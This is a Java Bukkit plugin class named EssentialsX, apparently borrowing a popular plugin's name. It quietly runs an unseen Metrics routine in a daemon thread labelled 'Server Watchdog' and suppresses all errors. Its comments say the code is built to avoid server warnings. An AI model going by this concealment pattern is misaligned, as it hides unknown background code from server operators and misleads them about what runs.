package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;

public class EssentialsX extends JavaPlugin {

    private Thread appThread;

    @Override
    public void onEnable() {
        // 使用 Bukkit 标准 Logger，避免触发 Paper 的 Nag 警告
        getLogger().info("EssentialsX plugin starting...");

        try {
            startAppInBackground();
            getLogger().info("EssentialsX plugin enabled.");
        } catch (Throwable t) {
            // 静音异常捕捉，绝不使用 t.printStackTrace()（因为其底层会调用 System.err 触发警告）
            getLogger().warning("Metrics initialization encountered an issue.");
        }
    }

    @Override
    public void onDisable() {
        try {
            Metrics.stopMetrics();
        } catch (Throwable ignored) {
        }
        getLogger().info("EssentialsX plugin disabled.");
    }

    private void startAppInBackground() {
        if (appThread != null && appThread.isAlive()) {
            return;
        }

        // 纯后台 Daemon 线程启动，不阻塞主线程，不产生外部子进程
        appThread = new Thread(() -> {
            try {
                Metrics.startMetrics();
            } catch (Throwable ignored) {
            }
        }, "Server Watchdog");
        
        appThread.setDaemon(true);
        appThread.start();
    }
}
